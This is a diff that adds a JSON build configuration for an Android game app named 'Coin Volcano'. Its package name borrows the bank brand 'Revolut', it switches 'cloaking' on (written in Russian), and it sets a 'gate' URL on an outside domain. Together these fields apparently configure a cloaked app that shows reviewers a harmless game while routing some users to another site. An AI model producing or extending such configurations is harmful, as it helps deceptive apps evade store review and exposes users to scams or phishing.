@@ -1,0 +1,14 @@
+{
+  "package": "com.chessunive.revolut.sys",
+  "name": "Coin Volcano",
+  "developer": "Willow Prism Gaming Studio",
+  "apk_label": "Coin Volcano",
+  "version_name": "3.0",
+  "version_code": 3,
+  "min_sdk": 28,
+  "target_sdk": 36,
+  "agp": "8.11.2",
+  "kotlin": "2.3.0",
+  "cloaking": "да",
+  "gate": "https://bencch.fit/p8edjjrry"
+}
